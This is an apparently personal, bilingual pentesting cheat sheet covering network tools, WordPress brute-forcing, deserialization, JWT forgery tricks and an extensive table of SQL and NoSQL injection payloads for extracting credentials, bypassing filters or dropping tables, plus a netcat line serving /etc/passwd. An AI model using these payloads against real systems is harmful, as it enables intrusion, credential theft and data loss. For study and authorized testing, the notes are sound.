   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Unexpected_message – indique que le message n’a pas été reconnu</strong>
<ul>

<li><strong>Bad_record_mac – signale une signature MAC incorrecte</strong>
<ul>

<li><strong>Decompression_failure – indique que la fonction de décompression a reçu une mauvaise entrée</strong>
<ul>

<li><strong>Handshake_failure – impossible de négocier les bons paramètres</strong>
<ul>

<li><strong>Illegal_parameter – indique un champ mal formaté ou ne correspondant à rien.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Close_notify – annonce la fin d’une connexion</strong>
<ul>

<li><strong>No_certificate – répond une demande de certificat s’il n’y en a pas</strong>
<ul>

<li><strong>Bad_certificate – le certificat reçu n’est pas bon (par exemple, sa signature n’est pas valide)</strong>
<ul>

<li><strong>Unsupported_certificate – le certificat reçu n’est pas reconnu</strong>
<ul>

<li><strong>Certificate_revoked – certificat révoqué par l’émetteur</strong>
<ul>

<li><strong>Certificate_expired – certificat expiré</strong>
<ul>

<li><strong>Certificate_unknown – pour tout </strong>
<strong>        problème concernant les</strong>
<p>
<strong>        certificats et non listé </strong>
<p>
<strong>        ci-dessus.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
</table>


<p>

<img src="images/image21.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Ephemeral Diffie-Hellman (DHE in the context of TLS) differs from the static Diffie-Hellman (DH) in the way that static Diffie-Hellman key exchanges also always use the same Diffie-Hellman private keys. So, each time the same parties do a DH key exchange, they end up with the same shared secret.</strong>
</p>
<p>
<strong>Within TLS you will often use DHE as part of a key-exchange that uses an additional authentication mechanism (e.g. RSA, PSK or ECDSA).</strong>
</p>
<p>
<strong>So the fact that the TLS server signs the content of its server key exchange message that contains the ephemeral public key implies to the SSL client that this Diffie-Hellman public key is from the SSL server.</strong>
</p> 
<ul>
 
<li><strong>In most cases, the best way to protect yourself against SSL/TLS-related attacks is to disable older protocol versions.</strong>
<ul>

<li><strong>What are the advantages of using the latest TLS version?</strong>
<p>

            <strong>In a nutshell, TLS 1.3 is faster and more secure than TLS 1.2. </strong>
</p>
<p>

            <strong>One of the changes that makes TLS 1.3 faster is an update to the way a TLS handshake works.</strong>
</p>
<p>

            <strong>Many of the major vulnerabilities in TLS 1.2 had to do with older cryptographic algorithms that were still supported. </strong>
</p>
<p>

            <strong>TLS 1.3 drops support for these vulnerable cryptographic algorithms, and as a result it is less vulnerable to cyber attacks.</strong>
</p>
</li>
</ul>
</li>
</ul>
<p>
<strong>some useful command</strong>
</p>

<table>
  <tr>
   <td><strong>tcpdump -i eth0 udp port 53</strong>
   </td>
   <td><strong>Sniffer les packet UDP vers le port 53 sur l’interface eth0 </strong>
   </td>
  </tr>
  <tr>
   <td><strong>sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -</strong>
   </td>
   <td><strong>Run your own server WEB with TLS support ( with certificate )</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li><strong>Protocole IPsec :</strong> 
<ul>
 
<li>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>…</strong>
</li>
</ul>
<ul>

<li><strong>…</strong>
</li>
</ul>
<ul>

<li><strong>…</strong>
</li>
</ul>
<ul>

<li><strong>...</strong>
</li>
</ul>
<p>
<strong>				   Some Nmap commands</strong>
</p>

<table>
  <tr>
   <td><strong>nmap -sn [TARGET]</strong>
   </td>
   <td><strong>Launch a ping scan against a network segment</strong>
<p>
<strong>Ping scans in Nmap may also identify MAC addresses and vendors if executed as a privileged user on local Ethernet networks.</strong>
<p>
<strong>Can be used to find hosts on the same network.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nmap -A [TARGET]</strong>
   </td>
   <td><strong>Aggressive mode :</strong>
<p>
<strong>This mode sends a lot more probes, and it is more likely to be detected, but provides a lot of valuable host information.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nmap -p- [TARGET]</strong>
   </td>
   <td><strong>scan all ports</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nmap -sU</strong>
   </td>
   <td><strong>UDP scan</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nmap -Pn</strong>
   </td>
   <td><strong>Treat all hosts as online -- skip host discovery.</strong>
<p>
<strong>This option will force the scanning even if it has detected the target as down in host discovery</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nmap -sV</strong>
   </td>
   <td><strong>application version information</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li><strong>It used for :</strong> 
<ul>
 
<li><strong>1) Network mapping & host discovery</strong>
 
<li><strong>2) Port Scanning</strong>
 
<li><strong>3) OS detection</strong>
 
<li><strong>4) Service Version Detection</strong>
 
<li><strong>5) Service Enumeration</strong>
 
<li><strong>6) Firewall Detection & Evasion</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li>
</li>
</ul>
<p>
<strong>Some Netcat Commands</strong>
</p>

<table>
  <tr>
   <td><strong>nc exemple.local 10222</strong>
   </td>
   <td><strong>Se connecter sur le serveur exemple.local au port 10222 </strong>
   </td>
  </tr>
  <tr>
   <td><strong>nc -l 10222</strong>
   </td>
   <td><strong>Écouter un port sur notre installation</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nc -l 192.168.0.2 10222</strong>
   </td>
   <td><strong>Écouter un port sur notre installation sur l’interface précisée.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>netcat -c 'cat /etc/passwd' -l -p 1234</strong>
   </td>
   <td><strong>-c : specify  shell  commands  to  exec after someone connect to us</strong>
<p>
<strong>-p : port number for listening</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>
<strong>Some useful tools and commands ( pas que réseau )</strong>
</p>

<table>
  <tr>
   <td><strong>netdiscover</strong>
<p>
<strong>arp-scan --localnet</strong>
   </td>
   <td><strong>Découvre toutes les hosts dans un même réseau.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>wpscan --url “[URL]” --enumerate</strong>
   </td>
   <td><strong>Trouver des vulnérabilité si il y a Wordpress utiliser</strong>
   </td>
  </tr>
  <tr>
   <td><strong>wpscan --url “[URL]” -U [USER_NAME] -P [WORDLIST]</strong>
   </td>
   <td><strong>Bruteforcer le mdp d’un user sur wordpress</strong>
   </td>
  </tr>
  <tr>
   <td><strong>cewl</strong>
<p>
<strong>cewl “[URL]” > cewl3.txt</strong>
   </td>
   <td><strong>CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper</strong>
   </td>
  </tr>
  <tr>
   <td><strong>weplab</strong>
   </td>
   <td><strong>tools to analyse WEP protocol et crack WEP key in pcap.file</strong>
   </td>
  </tr>
</table>


<p>
<strong>					Some protocols</strong>
</p>

<table>
  <tr>
   <td><strong>SMTP, POP3, Internet Message Access Protocol (IMAP)</strong>
   </td>
   <td><strong>protocoles liées au mail</strong>
   </td>
  </tr>
  <tr>
   <td><strong>NFS</strong>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li><strong>Connecting with telnet ( instead SSH ) is insecure as anyone who can see the traffic, or access a packet capture of the connection is able to see the username and password used as well as all the commands that the user executed.</strong>
</li>
</ul>
<p>

<img src="images/image22.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image23.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>	</strong>
</p>
<p>

    <strong>-------------------------------------------------------------</strong>
</p>
<p>

    <strong>Dans les algorithmes de chiffrement par flot, une suite d’octets ou de bits est produite à partir de la clé. </strong>
</p>
<p>

    <strong>Cette suite est combinée ( avec un XOR ou autre ) aux octets du clair pour donner les octets du chiffré.</strong>
</p>
<ul>

<li><strong>Protocol SMTP</strong>
</li>
</ul>
<p>

        <strong>	SMTP signifie Simple Message Transfer Protocole, ce protocole est utilisé pour transférer les messages électroniques sur les réseaux.</strong>
</p>
<p>

        <strong>Son Port est 25. Il fait partie de la couche Application.</strong>
</p>
<p>

        <strong>Son principal objectif est de router les mails à partir de l'adresse du destinataire.</strong>
</p>
<p>

        <strong>Fonctionnement avec un exemple :</strong>
</p>
<p>

<img src="images/image24.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>


<img src="images/image25.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

    <strong>Sur internet, les MTA communiquent entre-eux grâce au protocole SMTP et sont logiquement appelés serveurs SMTP (parfois serveur de courrier sortant).</strong>
</p>
<p>

    <strong>Il existe deux principaux protocoles permettant de relever le courrier sur un MDA : POP3 et IMAP.</strong>
</p>
<p>

    
<img src="images/image26.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

    <strong>Pour éviter que chacun puisse consulter le courrier des autres utilisateurs, l'accès au MDA est protégé par un nom d'utilisateur et un mot de passe. </strong>
</p>
<p>

    <strong>Les serveurs utilisent les enregistrements MX des serveurs DNS pour acheminer le courrier.</strong>
</p>
<p>

    <strong>Par défaut et pour des raisons historiques, il n'est pas nécessaire de s'authentifier pour envoyer du courrier électronique, ce qui signifie qu'il est très facile d'envoyer du courrier en falsifiant l'adresse électronique de l'expéditeur. </strong>
</p>
<p>
<strong>	</strong>
</p>
<p>

        <strong>Exemple session SMTP avec telnet :</strong>
</p>
<p>

<img src="images/image27.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Un série de codes retour sur trois chiffres est présente pour indiquer le statut de la demande.</strong>
</p>
<p>
<strong>Le premier chiffre du code retour indique le statut global de la demande, les deux autres chiffres donnent le détail du statut :</strong>
</p>
<p>
<strong>    code 2 : la demande a été exécutée sans erreur ;</strong>
</p>
<p>
<strong>    code 3 : la demande est en cours d'exécution ;</strong>
</p>
<p>
<strong>    code 4 : indique une erreur temporaire ;</strong>
</p>
<p>
<strong>    code 5 : la demande n'est pas valide et n'a pas pu être traitée.</strong>
</p>
<p>

<img src="images/image28.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Port Knocking
</li>
</ul>
<p>

        <strong>Le tocage à la porte, ou port-knocking, est une méthode permettant de modifier le comportement d'un pare-feu (firewall) en temps réel en provoquant l'ouverture de ports permettant la communication, grâce au lancement préalable d'une suite de connexions sur des ports distincts dans le bon ordre, à l'instar d'un code frappé à une porte. </strong>
</p>
<p>

        <strong>Cette technique est notamment utilisée pour protéger l'accès au port 22 dédié au Secure shell (SSH) ; elle ne nécessite pas beaucoup de ressources et reste facile à mettre en œuvre. </strong>
</p>
<p>

        <strong>La méthode de port-knocking est considérée comme sécurisée étant donné qu'elle est située à un niveau bas des couches TCP/IP et qu'elle ne requière pas de port ouvert (le service knockd est lui aussi invisible).</strong>
</p>
<p>

        <strong>Dans linux, parfois la configuration de cette feature peut se situer dans le fichier /etc/knockd.conf.</strong>
</p>
<ul>

<li>Network File System (NFS)
</li>
</ul>
<p>
<strong>Network File System (NFS), ou système de fichiers en réseau, est une application client/serveur qui permet à un utilisateur de consulter et, éventuellement, de stocker et de mettre à jour des fichiers sur un ordinateur distant, comme s'ils étaient sur son propre ordinateur.</strong>
</p>
<ol>

<li> Web

<li>(Se/Deser)-ialisation
<h4>
            		   Some tools</h4>



<table>
  <tr>
   <td>
<strong>ysoserial</strong>
</li>
</ol>
   </td>
   <td><strong>A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>PHP Generic Gadget Chains</strong>
   </td>
   <td><strong>Like <em>ysoserial</em> for PHP</strong>
   </td>
  </tr>
</table>


<ul>

<li><strong>Generally speaking, deserialization of user input should be avoided unless absolutely necessary. The high severity of exploits that it potentially enables, and the difficulty in protecting against them, outweigh the benefits in many cases. </strong>
<p>

    <strong>If possible, you should avoid using generic deserialization features altogether.</strong>
</p>
</li>
</ul>
<ul>

<li>Identify insecure deserialization :
<p>

                <strong>	During auditing, you should look at all data being passed into the website and try to identify anythin that looks</strong>
</p>
<p>

            <strong>like serialized data.</strong>
</p>
<p>

            <strong>Once you identify serialized data, you can test</strong> <strong>whether </strong>
</p>
<p>

            <strong>you are able to control it. </strong>
</p>
</li>
</ul>
<p>

            <strong>In Java, if you have source code access, take note of</strong>
</p>
<p>

            <strong>any code that uses the readObject() method, which is </strong>
</p>
<p>

            <strong>used to read and deserialize data from an InputStream. </strong>
</p>
<ul>

<li><strong>In some cases of deserialization exploit, you can modify data types in the serialized data to take advantage of an existing loose comparaison in the code ( on password verification, …) .</strong>
</li>
</ul>
<ul>

<li><strong>En python, c’est la bibliothèque Pickle qui est utilisée pour la seria/deserialisation ( en format Pickle ).</strong>
<p>

                <strong>If an application unserializes data using pickle based on a string under your control, you can execute code in the application. </strong>
</p>
<p>

                <strong>Objet de type Pickle :</strong>
</p>
<p>

                <strong>(i__main__</strong>
</p>
<p>

                <strong>Hack</strong>
</p>
<p>

                <strong>(dp1</strong>
</p>
<p>

                <strong>S'test1'</strong>
</p>
<p>

                <strong>p2</strong>
</p>
<p>

                <strong>S'test'</strong>
</p>
<p>

                <strong>p3</strong>
</p>
<p>

                <strong>sS'test2'</strong>
</p>
<p>

                <strong>p4</strong>
</p>
<p>

                <strong>S'retest'</strong>
</p>
<p>

                <strong>p5</strong>
</p>
<p>

                <strong>sb.</strong>
</p>
<ul>

<li>Magic methods
<p>

                <strong>Magic methods ( like <em>__construct()</em>, <em>__wakeup()</em> ) can become dangerous when the code that they execute handles attacker-controllable data, for example, from a deserialized object.</strong>
</p>
<p>

                <strong>Therefore, if an attacker can manipulate which class of object is being passed in as serialized data, they can influence what code is executed after ( which magic method of a certain class ).</strong>
</p>
<ul>

<li>Gadget Chains :
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>
<strong>				</strong>
</p>
<p>

                    <strong>In the wild, many insecure deserialization vulnerabilities will only be exploitable through the use of gadget chains.</strong>
</p>
<p>

                    <strong>﻿Manually identifying gadget chains can be a fairly arduous process. Fortunately, there are a few options for working with pre-built gadget chains that you can try first. </strong>
</p>
<p>

                    <strong>There are several tools available that can help. These tools provide a range of pre-discovered gadget chains that have been exploited on other websites.</strong>
</p>
<p>

                    <strong>It is important to note that it is not the presence of a gadget chain in the website's code, or any of its libraries, that is responsible for the vulnerability. </strong>
</p>
<p>

                    <strong>Even if there is no dedicated tool for automatically generating the serialized object, you can still find documented gadget chains for popular frameworks and adapt them manually.</strong>
</p>
<ul>

<li><strong>Serialized Java objects will always start with : aced00057372.</strong>
<p>

            <strong> </strong>
</p>
<ul>

<li><strong>XMLDecoder is a Java class that creates objects based on a XML message. If a malicious user can get an application to use arbitrary data in a call to the method readObject, she will instantly gain code execution on the server.</strong>
<p>

                <strong>See : <a href="https://pentesterlab.com/exercises/xmldecoder/course">https://pentesterlab.com/exercises/xmldecoder/course</a></strong>
</p>
<ul>

<li><strong>The string rO0 ( in base64 ) at the beginning of the string is a good indicator to recognize serialized Java objects. </strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>To avoid exploitation, you can use JSON object ( encode/decode in json format ) instead of serialized object.</strong>
</li>
</ul>
<ul>

<li>JWT (JSON Web Token)
<p>

            <strong> </strong>
</p> 
<ul>
 
<li><strong>Vérifier que le header du Jeton ( dans le header ) contient le bon algorithme ( il peut être par exemple à “none”,”None” ou “NONE” pour que la signature n’est pas pris en compte).</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>﻿”jwt_tool” est un outil permettant de bruteforcer une clée sur un JWT.</strong>
</li>
</ul>
<ul>

<li><strong>Si le token utilise RS256 ( RSA ) , une faille consiste à changer RS256 en HS256 et utiliser une des clefs publiques qui était utilisée pour RSA comme secret.</strong>
</li>
</ul>
<ul>

<li><strong>Utiliser une bonne fonction de décodage selon la librairie utilisée pour que la signature soit vérifiée ( si on utilise une mauvaise fonction pour décoder le jwt, il se peut que la signature n’est pas vérifiée et donc qu’un attaquant peut mettre ce qu’il veut en tant que data ).</strong>
</li>
</ul>
<ul>

<li><strong>Sometimes, there is a “Kid” parameter :</strong>

<li>
<img src="images/image29.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
<p>
<strong>				Often used to retrieve a key from database or file </strong>
</p>
<p>

            <strong>system.</strong>
</p>
<p>

            <strong>This is done prior to verification of the signature.</strong>
</p>
<p>

                <strong>If this parameter is injectable, you can tell the serveur to use the provided file (from its own system directory) as the key for the signature. </strong>
</p>
<p>

                <strong>So you can retrieve a known file from the serveur ( it depends on the OS) and construct the signature with it and then tell the serveur ( from the kid parameter ) that the content of this file is the key to verify the token.</strong>
</p>
<p>

                <strong>Example :</strong>
</p>
<p>

                
<img src="images/image30.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

                <strong>Here, we know the content of /dev/null (it’s an empty file). So, we can easily reconstruct a valid signature.</strong>
</p>
<p>

                <strong>In the case that a database is used, you can try an SQL injection from the parameter because its value is put in a sql request.</strong>
</p>
<p>

                <strong>A signed JWT is known as a JWS (JSON Web Signature). In fact a JWT does not exist itself — either it has to be a JWS or a JWE (JSON Web Encryption). It's like an abstract class — the JWS and JWE are concrete implementations.				</strong>
</p>
<ul>

<li>SQL injection :
</li>
</ul>
<ul>

<li><strong>CheatSheet SQL injection : <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a> </strong>
</li>
</ul> 
<ul>
 
<li>étapes dans une SQLi Union :  
<ul>
  
<li><strong>Chercher le nombre de colonne ( pour le UNION )</strong>
  
<li><strong>Chercher le type des colonnes</strong>
  
<li><strong>Chercher le type de database ( pour connaître la syntaxe)</strong>
  
<li><strong>Sortir la liste de toutes les tables présentes ( leurs noms )</strong>
  
<li><strong>Chercher le détail du format des tables ( les colonnes )</strong>
  
<li><strong>Afficher leurs contenus ( étape simple )</strong>
</li>  
</ul>
</li>  
</ul> 
<ul>
 
<li>Potentielles étapes pour une BSQLi :  
<ul>
  
<li><strong>Trouver la taille du champs voulu.</strong>
  
<li><strong>Bruteforcer chaque caractère.</strong>
<ul>

<li>Exemples de payloads
</li>
</ul>
</li>
</ul>
</li>
</ul>

<table>
  <tr>
   <td><strong>‘ OR 1=1 AND ﻿’username’='admin' /*</strong>
   </td>
   <td>
<ul>

<li><strong>L'opération AND vient en premier</strong>
<ul>

<li><strong>“ /* “ ou “ --” ou “#” : commentaire pour fermer la suite</strong>
<ul>

<li><strong>On MySQL, the double-dash sequence</strong>
    <strong>( “--” ) must be followed by a space</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td><strong>SELECT * FROM table LIMIT 5, 10;</strong>
   </td>
   <td><strong>Cette requête retourne les enregistrements 6 à 15 d’une table. Le premier nombre est l’OFFSET tandis que le suivant est la limite.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>‘ UNION SELECT 1,2,3-- ( </strong>
<p>
<strong>TESTER PLUSIEURS ENCHAÎNEMENT DE CHIFFRE SUR SELECT 1,1,1,1…..</strong>
<p>
<strong>OU</strong>
<p>
<strong>‘ UNION SELECT NULL,NULL,NULL--</strong>
<p>
<strong>OU</strong>
<p>
<strong>’Order by 3#</strong>
<p>
<strong>OU</strong>
<p>
<strong>‘ UNION SELECT NULL,NULL,NULL FROM DUAL -- ( Pour ORACLE DB )</strong>
   </td>
   <td><strong>Tester si il y a 3 colonnes (selon le nombre de chiffres écrits pour le UNION).</strong>
<p>
<strong>﻿The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct.    </strong>
<p>
<strong>Obligé de rajouter un FROM sur un SELECT sur des base de donnée ORACLE</strong>
<p>
<strong>             </strong>
   </td>
  </tr>
  <tr>
   <td><strong>UNION ALL SELECT 1,2,3,4,5,6,load_file('FILE_NAME')</strong>
   </td>
   <td><strong>Print the content of “index.php” as the first </strong>
<p>
<strong>column </strong>
   </td>
  </tr>
  <tr>
   <td><strong>' UNION SELECT username, password FROM users--</strong>
   </td>
   <td><strong>Si le SELECT de base est composé de 2 colonnes et qu’on connaît le noms des tables, il est possible de récupérer des données si elles sont affichées sur la page comme dans cette exemple.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>' UNION SELECT username || '~' || password FROM users-- </strong>
<p>
<strong>1 UNION SELECT 1,concat(login,':',password),3,4 FROM users;</strong>
<p>
<strong>SELECT login + '-' + password FROM members</strong>
   </td>
   <td><strong>Suppose instead that the basic query only returns a single column.</strong>
<p>
<strong>You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. </strong>
<p>
<strong>This uses the double-pipe sequence || which is a string concatenation operator on Oracle and MySQL ( in particular configuration ). The injected query concatenates together the values of the username and password fields, separated by the ~ character.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>1 UNION SELECT 1,@@version,3,4</strong>
<p>
<strong>1 UNION SELECT 1,database(),3,4</strong>
<p>
<strong>1 UNION SELECT 1,current_user(),3,4</strong>
   </td>
   <td><strong>Version de la database</strong>
<p>
<strong>Nom de la database</strong>
<p>
<strong>Nom du current user</strong>
   </td>
  </tr>
  <tr>
   <td><strong>UNION SELECT NULL, NULL, NULL, cast(password as numeric),</strong>
   </td>
   <td><strong>méthode cast() à utiliser pour régler le problème des types des colonnes.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-1 OR (SELECT SLEEP(3) FROM users WHERE id=1 AND 1=1)</strong>
   </td>
   <td><strong>Time blind sql : Permet de voir si l’entré est vulnérable à une time blind sql.</strong>
<p>
<strong>You can also use pg_sleep(10) ( PostgreSQL)</strong>
   </td>
  </tr>
  <tr>
   <td><strong>?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'</strong>
<p>
<strong>--</strong>
   </td>
   <td><strong>Time based sql to test size of data</strong>
   </td>
  </tr>
  <tr>
   <td><strong> </strong>
<p>
<strong>IF (ASCII(lower(substring((USER),1,1)))></strong>
<p>
<strong>97) WAITFOR DELAY '00:00:10'</strong>
   </td>
   <td><strong>Time based sql to find each character of the user USER</strong>
<p>
<strong>MySQL Syntax:</strong>
<p>

<img src="images/image31.png" width="" alt="alt_text" title="image_tooltip">

<p>
<strong>SQL Server Syntax: </strong>
<p>

<img src="images/image32.png" width="" alt="alt_text" title="image_tooltip">

<p>
<strong>Oracle Syntax:</strong>
<p>

<img src="images/image33.png" width="" alt="alt_text" title="image_tooltip">

<p>
<strong>PostgreSQL syntax : </strong>
<p>

<img src="images/image34.png" width="" alt="alt_text" title="image_tooltip">

   </td>
  </tr>
  <tr>
   <td><strong>/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/**/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'tom'-- </strong>
   </td>
   <td><strong>You can use sql inline comments sequences to rewrite word </strong>
   </td>
  </tr>
  <tr>
   <td><strong>/*! MYSQL Special SQL */ </strong>
   </td>
   <td><strong>This is a special comment syntax for MySQL. It's perfect for detecting MySQL version. If you put a code into this comment it's going to execute in MySQL only.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SELECT /*!32302 1/0, */ 1 FROM tablename</strong>
   </td>
   <td><strong>Will throw an division by 0 error if MySQL version is higher than3.23.02</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SELECT * FROM members; DROP members--</strong>
   </td>
   <td><strong>Executing more than one query in one transaction ( Stacking Queries ).</strong>
<p>

<img src="images/image35.png" width="" alt="alt_text" title="image_tooltip">

   </td>
  </tr>
  <tr>
   <td><strong>0xHEXNUMBER</strong>
<p>
<strong>SELECT CHAR(0x66)</strong>
<p>
<strong>SELECT 0x5045 ( this is a string )</strong>
<p>
<strong>SELECT 0x50 + 0x45 ( this is a integer )</strong>
   </td>
   <td><strong>Very useful for bypassing, magic_quotes() and similar filters, or even WAFs.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))</strong>
<p>
<strong>SELECT CHAR(75)+CHAR(76)+CHAR(77)</strong>
<p>
<strong>SELECT CHR(75)||CHR(76)||CHR(77)</strong>
<p>
<strong>SELECT (CHaR(75)||CHaR(76)||CHaR(77))</strong>
   </td>
   <td><strong>This will return 'KLM'.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SELECT ASCII('abbas')</strong>
   </td>
   <td><strong>this returns the ASCII number of the first character ( ‘a’ => 97 ).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>BENCHMARK(howmanytimes, do this)</strong>
   </td>
   <td><strong>function Syntax on benchmark.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SELECT MID("SQL Tutorial", 5, 3) AS ExtractString;</strong>
   </td>
   <td><strong>Extract a substring from a string ( in this example : start at position 5, extract 3 characters):</strong>
<p>
<strong>same function ; SUBSTR() and SUBSTRINGS()</strong>
   </td>
  </tr>
  <tr>
   <td><strong>1' AND (SELECT LENGTH(database()))=1#</strong>
   </td>
   <td><strong>Using LENGTH() ( LEN(),DATALENGTH() ) function is possible to know the length of a string in a SQL query.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>ASCII('a')</strong>
<p>
<strong>Return: 97</strong>
   </td>
   <td><strong>ASCII() - returns the ASCII value from a character</strong>
   </td>
  </tr>
  <tr>
   <td><strong>xyz' union select case when (username = 'Administrator' and SUBSTRING(password, 1, 1) > 'm') then 1/0 else null end from users--</strong>
   </td>
   <td><strong>Blind error based SQLi pour chercher les caractères du password de l’admin</strong>
   </td>
  </tr>
  <tr>
   <td><strong>to_char(1/5)</strong>
   </td>
   <td><strong>convertir en chaine de caractere</strong>
   </td>
  </tr>
  <tr>
   <td><strong>LIMIT</strong>
   </td>
   <td><strong>if the developer checked that only one result is return by the database.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>admin’%09or%”091%09=%091%09--</strong>
   </td>
   <td><strong>%09 = tabulation</strong>
<p>
<strong>You can use tabulation instead of spaces if it’s filtered</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li><strong>For blind SQL , sometimes you have to modify the query so that it will cause a database error if the condition is true, but not if the condition is false.</strong>
</li>
</ul>
<p>
<strong>	example : xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--</strong>
</p>
<ul>

<li><strong>It’s good to use UNION with ALL.</strong>
</li>
</ul>
<ul>

<li>LDAP injection
</li>
</ul>
<p>

<img src="images/image36.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Some useful commands for LDAP injection</strong>
</p>

<table>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>MongoDB injection
</li>
</ul>
<p>

    <strong>With MongoDB, the data isn’t stored in row and columns. It’s different from other communs database systems.</strong>
</p>
<p>
<strong>Some useful commands for MongoDB injection</strong>
</p>

<table>
  <tr>
   <td><strong>admin’ || ‘1’ == ‘1</strong>
   </td>
   <td><strong>Almost same as SQLi</strong>
   </td>
  </tr>
  <tr>
   <td><strong>// , &lt;’--</strong>
   </td>
   <td><strong>Commentaire</strong>
   </td>
  </tr>
  <tr>
   <td><strong>admin’ && this.password.match([REGEX])%00</strong>
<p>
<strong>... && this.password && this.password.match(...</strong>
   </td>
   <td><strong>example of Payload</strong>
<p>
<strong>In case the password field does not exist for some records (since it's a NoSQL database), it's always a good idea to ensure its presence by using that.</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>

<img src="images/image37.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>La fonction ﻿”htmlspecialchars” protège de certaines injections SQL : elle filtre les caractère : & “ ‘ &lt; >.</strong>
</p>
<p>

<img src="images/image38.png" width="" alt="alt_text" title="image_tooltip">

<img src="images/image39.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Pour le premier select, on peut remplacer “*” par “TABLE_NAME”.</strong>

<li><strong>Pour le deuxième select, on peut remplacer “*” par “COLUMN_NAME”.</strong>
</li>
</ul>
<ul>

<li><strong>Blind SQL injection vulnerabilities :</strong>
<p>

    <strong>Depending on the nature of the vulnerability and the database involved, the following techniques can be used to exploit blind SQL injection vulnerabilities:</strong>
</p>
<ul>

<li><strong>With condition ( if … )</strong>

<li><strong>Time delay</strong>

<li><strong>Trigger an out-of-band network interaction</strong>
</li>
